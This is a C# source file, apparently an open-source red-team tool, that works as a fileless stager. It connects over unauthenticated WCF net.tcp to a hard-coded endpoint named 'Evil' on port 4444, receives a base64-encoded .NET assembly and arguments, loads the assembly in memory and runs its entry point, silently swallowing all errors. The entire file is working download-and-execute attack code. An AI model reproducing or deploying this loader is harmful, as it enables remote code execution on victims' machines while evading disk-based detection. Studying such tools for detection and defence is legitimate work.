using System;
using System.ServiceModel;
using System.Reflection;
using System.IO;
using System.Linq;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    static void Main(string[] args)
    {
         try
         {
            var endPoint = new EndpointAddress("net.tcp://192.168.55.250:4444/Evil");
            var binding = new NetTcpBinding(SecurityMode.None);
            binding.MaxReceivedMessageSize = Int32.MaxValue;
            var channel = new ChannelFactory<Interface2>(binding, endPoint);
            var client = channel.CreateChannel();

            //Return source from server
            String[] source = client.b64Assembly1();

            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);

            //Arguments
            object[] cmd = source.Skip(1).ToArray();

            //Read the bytes from the binary file
            MemoryStream ms = new MemoryStream(decode);
            BinaryReader br = new BinaryReader(ms);
            byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
            ms.Close();
            br.Close();
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { cmd });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
         }
         catch
         { }
    }
}

//WCF Public Server Interface
[ServiceContract]
public interface Interface2
{
    [OperationContract]
    String[] b64Assembly1();
}
